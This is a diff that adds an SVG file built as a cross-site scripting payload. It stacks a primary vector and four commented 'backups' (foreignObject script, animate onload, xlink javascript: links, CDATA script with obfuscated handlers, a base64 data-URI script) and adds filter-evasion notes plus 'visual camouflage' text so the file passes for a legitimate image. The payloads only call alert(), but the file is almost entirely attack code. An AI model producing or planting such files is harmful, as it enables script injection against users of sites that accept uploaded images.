@@ -1,0 +1,35 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <defs>
+    <!-- Primary payload: javascript: protocol via foreignObject (most reliable) -->
+    <foreignObject id="xss" width="100%" height="100%">
+      <div xmlns="http://www.w3.org/1999/xhtml">
+        <a href="javascript:alert('XSS')">Click for XSS</a>
+        <script>alert('XSS')</script>
+      </div>
+    </foreignObject>
+    
+    <!-- Backup 1: Animation-based onload -->
+    <animate id="anim" attributeName="onload" begin="0s" values="alert('XSS');"/>
+    
+    <!-- Backup 2: XLink attack -->
+    <rect width="100" height="100" xlink:href="javascript:alert('XSS')"/>
+    
+    <!-- Backup 3: Event handler obfuscation -->
+    <script><![CDATA[
+      /* CDATA bypasses HTML entity filtering */
+      window.onload = function(){alert('XSS')};
+      /* Multiple whitespace variants */
+      o­nlo­ad=alert('XSS')
+    ]]></script>
+    
+    <!-- Backup 4: Data URI with multiple encodings -->
+    <image xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+  </defs>
+  
+  <!-- Trigger via use reference (often missed by filters) -->
+  <use href="#xss" x="0" y="0" width="1" height="1" onload="alert('XSS')"/>
+  
+  <!-- Visual camouflage - makes it look like legit image -->
+  <rect width="400" height="300" fill="#f0f0f0"/>
+  <text x="10" y="20" font-size="12" fill="#666">Loading secure image...</text>
+</svg>
